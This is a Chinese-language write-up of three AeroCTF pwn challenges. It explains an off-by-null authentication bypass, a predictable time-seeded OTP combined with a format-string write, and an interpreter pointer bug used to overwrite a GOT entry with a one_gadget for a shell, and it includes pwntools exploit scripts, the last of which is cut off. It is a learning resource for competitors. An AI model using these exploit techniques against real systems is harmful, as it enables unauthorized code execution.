这周打了打AeroCTF，把pwn ak了。以下是Writeup
## Warm up
这题很简单，考的是stack overflow，
### 题目分析
先看main函数
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
    char buf[32]; // [esp+1h] [ebp-29h]
    char v5; // [esp+21h] [ebp-9h]
    int *v6; // [esp+22h] [ebp-8h]
    v6 = &argc;
    v5 = 1;
    puts("Memes server");
    printf("Enter the password: ");
    fflush(stdout);
    buf[read(0, buf, 32u)] = 0;
    if ( auth(buf) )
    v5 = 0;
    if ( v5 )
    puts("[-] Auth error!");
    else
    readMeme();
    return -1;
    }
如果登录成功令v5为0即可拿到flag。但是auth函数每次都会生成新的密码，并且无法破解。  
程序的问题在于`buf[read(0, buf, 32u)] = 0;`存在off-by-null，而且正好会覆盖v5为0。我们只要输入0x20长度的内容即可。
### exp
32个a
## navigation system
考查随机数和格式化字符串漏洞
### 题目分析
先看一下保护情况
> Arch: i386-32-little  
>  RELRO: Partial RELRO  
>  Stack: Canary found  
>  NX: NX enabled  
>  PIE: No PIE (0x8048000)
有canary但没开PIE  
先看以下main函数
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int a2; // [esp+0h] [ebp-48h]
      int v5; // [esp+4h] [ebp-44h]
      char s1; // [esp+Ah] [ebp-3Eh]
      char v7; // [esp+1Bh] [ebp-2Dh]
      unsigned int v8; // [esp+3Ch] [ebp-Ch]
      int *v9; // [esp+40h] [ebp-8h]
      v9 = &argc;
      v8 = __readgsdword(0x14u);
      wlc_msg();
      __isoc99_scanf((int)"%16s", (int)&s1);
      printf("Password: ");
      fflush(stdout);
      __isoc99_scanf((int)"%32s", (int)&v7);
      if ( strcmp(&s1, valid_login) )
      {
        puts("Username is invalid!");
        exit(-1);
      }
      if ( strcmp(&v7, valid_password) )
      {
        puts("Passowrd is invalid!");
        exit(-2);
      }
      v5 = genOTPcode(&s1, &v7);
      printf("Enter the OTP code: ", v5);
      fflush(stdout);
      __isoc99_scanf((int)"%d", (int)&a2);
      if ( v5 == a2 )
        UserPanel(&s1);
      puts("OTP is incorrect!");
      fflush(stdout);
      return -1;
    }
name和password都是常量字符串，之后需要输入一个OTP(One Time Pad)才能进入后续逻辑。看一下OTP的生成过程。
    int __cdecl genOTPcode(char *a1, char *a2)
    {
      time_t v2; // eax
      unsigned int v3; // eax
      v2 = time(0);
      srand(*a2 + *a1 + v2);
      v3 = rand();
      return v3 + (v3 >= 0xFFFFFFFF);
    }
可以看到OTP每次都是随机生成的，但是随机的种子是当前的时间和两个字符的和。a2和a1是常量字符，因此我们可以通过当前的时间推测出OTP的值，这样即可通过检查进入主逻辑。  
然后进入主逻辑,发现UserPanel中只有两个功能Set station和Read report。先看一下Read reprot：
    int readLastReport()
    {
      if ( flag )
        system("/bin/cat report.txt");
      else
        printf("[-] Access denied!");
      return putchar(10);
    }
检查了一个bss段的标志位flag，如果不为0则直接返回flag的值（report.txt里是flag）。  
再看一下Set station函数:
    unsigned int setStation()
    {
      char buf[32]; // [esp+Ch] [ebp-2Ch]
      unsigned int v2; // [esp+2Ch] [ebp-Ch]
      v2 = __readgsdword(0x14u);
      printf("Set station > ");
      fflush(stdout);
      buf[read(0, buf, 0x20u)] = 0;
      printf("Station: ");
      printf(buf);
      putchar(10);
      return __readgsdword(0x14u) ^ v2;
    }
显然有一个格式化字符串漏洞，printf直接打印了我们输入的内容。由于没有开PIE，所以我们可以直接用格式化字符串漏洞任意写的能力来改写bss段上flag的值。
### exp
解题思路  
1.先根据当前时间生成OTP，通过检查  
2.利用格式化字符串漏洞，把flag的值改为1  
3.触发read report函数，拿到flag
    #!/usr/bin/env python
    from pwn import *
    import sys
    context.log_level="debug"
    #context.log_level="info"
    code=ELF("./navigation",checksec=False)
    context.terminal = ['gnome-terminal','-x','sh','-c']
    context.arch = code.arch
    if len(sys.argv)>2:
        con=remote(sys.argv[1],int(sys.argv[2]))
    elif len(sys.argv)>1:
        libc = ELF(sys.argv[1])
        con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
    else:
        con=code.process()
        if(context.arch == "amd64"):
            libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    from ctypes import *
    def otp():
        tmp = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
        seed = tmp.time(0)
        seed+=ord("t")*2
        tmp.srand(seed)
        return tmp.rand()
    def z(commond=""):
        gdb.attach(con,commond)
    def overwriteflag():
        con.sendlineafter(">","2")
        flag=0x804c058
        payload=p32(flag)+"%7$hnn"
        con.sendlineafter(">",payload)
    def exploit():
        con.sendlineafter("Login: ","test_account")
        con.sendlineafter("Password: ","test_password")
        con.sendlineafter("code: ",str(otp()))
        overwriteflag()
        con.sendlineafter(">","1")
    exploit()
    con.interactive()
## enginescipt
### 题目分析
> Arch: i386-32-little  
>  RELRO: Partial RELRO  
>  Stack: Canary found  
>  NX: NX enabled  
>  PIE: No PIE (0x8048000)
先看一下保护，没开PIE。  
这个题是一个脚本的解释器，用户可以输入一段字节码，然后程序会逐字节的解释执行这段字节码。代码如图
    int __cdecl execCode(char *s)
    {
      int result; // eax
      int i; // [esp+8h] [ebp-10h]
      signed int v3; // [esp+Ch] [ebp-Ch]
      v3 = strlen(s);
      stack_ptr = &stack;
      for ( i = 0; ; ++i )
      {
        result = i;
        if ( i >= v3 )
          break;
        proceedOpertaion(s[i]);
      }
      return result;
    }
stack是解释器的虚拟栈，用于存放解释器执行过程中的数据，实际位于程序的BSS段。stack_ptr是一个指针，初始指向虚拟栈（实则是bss段的地址），同样也存在BSS段上。  
接着看解释器的具体执行代码：
    _BYTE **__cdecl proceedOpertaion(char a1)
    {
      _BYTE **result; // eax
      char v2; // ST2C_1
      fflush(stdout);
      fflush(stdin);
      switch ( a1 )
      {
        case 'a':
          result = (_BYTE **)stack_ptr[0];
          ++*stack_ptr[0];
          break;
        case 'd':
          result = stack_ptr;
          --stack_ptr[0];
          break;
        case 'g':
          v2 = getchar();
          result = (_BYTE **)stack_ptr[0];
          *stack_ptr[0] = v2;
          break;
        case 'p':
          result = (_BYTE **)putchar((char)*stack_ptr[0]);
          break;
        case 's':
          result = (_BYTE **)stack_ptr[0];
          --*stack_ptr[0];
          break;
        case 'u':
          result = stack_ptr;
          ++stack_ptr[0];
          break;
        default:
          exit(-1337);
          return result;
      }
      return result;
    }
其语法和Brainfuck相似，共有6种操作，分别是加减指针，加减指针指向的内容，读取输入，打印指针指向的内容。漏洞在于正常来讲，解释器的指针应该只能指向虚拟栈的空间，但显然程序没有对指针做任何的检查。由于没开PIE，所以指针的初始值是已知的，我们可以通过加减随意控制指针，然后通过这个指针进行任意读写。  
下来可以通过控制指针，让其指向got表，然后利用打印功能泄露libc的地址。之后想办法弹shel，通过打印功能，我们可以控制putchar函数的参数，但去阅读一下汇编指令，发现这个参数只能是一个char，无法让参数是'/bin/sh'，但我们可以通过这个参数控制eax的值，所以想到用eax=0的one
gadget。我们先用指针的写功能，将got表的putchar函数改为one
gadget。然后再让指针指向一片为0的空间，再调用putchar函数，此时eax恰好为0，能够成功触发one gadget。
### exp
解题思路如下：  
1.先修改指针到scanf，泄露libc地址  
2.修改指针到putchar，修改putchar地址为one gadget  
3.修改指针到一段全为0的空间，通过p触发one gadget 拿到shell
    #!/usr/bin/env python
    from pwn import *
    import sys
    context.log_level="debug"
    #context.log_level="info"
    code=ELF("./es",checksec=False)
    context.terminal = ['gnome-terminal','-x','sh','-c']
    context.arch = code.arch
    if len(sys.argv)>2:
        con=remote(sys.argv[1],int(sys.argv[2]))
        libc=ELF("./libc.so")
    elif len(sys.argv)>1:
        libc = ELF(sys.argv[1])
        con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
    else:
        con=code.process()
        if(context.arch == "amd64"):
            libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    def z(commond=""):